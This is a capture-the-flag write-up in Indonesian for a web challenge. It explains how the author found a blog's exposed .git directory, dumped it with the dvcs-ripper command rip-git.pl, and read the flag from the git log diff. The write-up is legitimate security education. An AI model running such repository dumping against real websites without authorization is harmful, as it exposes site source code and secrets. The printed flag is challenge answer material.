Deskripsi soal:
<pre>
I stumbled across this kinda oldskool blog. I bet it is unhackable, I mean, there's only static HTML. 
https://0ldsk00lblog.ctf.internetwache.org/.
</pre>

<h3>Solved by snoww0lf</h3>

Ini adalah soal web yang cukup mudah, jika kita perhatikan sekilas ini hanyalah sebuah web statis yang menurut saya tidak memiliki keistimewaan. Namun beberapa konten di situs tersebut memberikan beberapa clue yakni "All people are talking about a tool called 'Git'. I think I might give this a try.", nampaknya saat web ini dideploy mereka sengaja tidak menghapus direktori ".git". Untuk itu saya coba untuk mengakses https://0ldsk00lblog.ctf.internetwache.org/.git/ dan didapatkan 403 Forbidden, ini menandakan direktori tersebut tersedia.

Tahap berikutnya ialah melakukan cloning git tersebut, disini saya menggunakan "dvcs-ripper" yang dapat didownload disitus berikut ini https://github.com/kost/dvcs-ripper lalu menjalankan dan mengeksekusinya melalui console.

```bash
./rip-git.pl -s -v -u https://0ldsk00lblog.ctf.internetwache.org/.git/
```

Setelah berhasil di-clone maka , saatnya untuk mengecek log terakhir dari hasil cloning tadi di folder ".git", dengan menggunakan perintah "git log -p" ditampilkan beberapa output yang cukup menarik.

```html
commit 26858023dc18a164af9b9f847cbfb23919489ab2
Author: Sebastian Gehaxelt <github@gehaxelt.in>
Date:   Fri Jan 22 02:57:44 2016 +0100

    Added another post

diff --git a/index.html b/index.html
index 91f09a7..5508adb 100644
--- a/index.html
+++ b/index.html
@@ -3,12 +3,21 @@
        <title>0ldsk00l</title>
 </head>
 <body>
+       <h2>2000</h2>
+       <p>
+               Oh, did I say that I like kittens? I like flags, too: IW{G1T_1S_4W3SOME}
+       </p>
+
+       <h2>1990-2015</h2>
+       <p>
+               Hmm, looks like totally forgot about this page. I should start blogging more often.
+       </p>
 
        <h2>1990</h2>
        <p>
                I proudly present to you the very first browser for the World Wide Web. Feel free to use it to view my awesome blog.
        </p>
-       
+
        <h2>1989</h2>
        <p>
                So, yeah, I decided to invent the World Wide Web and now I'm sitting here and writing this. 
```

Flag: <b>IW{G1T_1S_4W3SOME}</b>
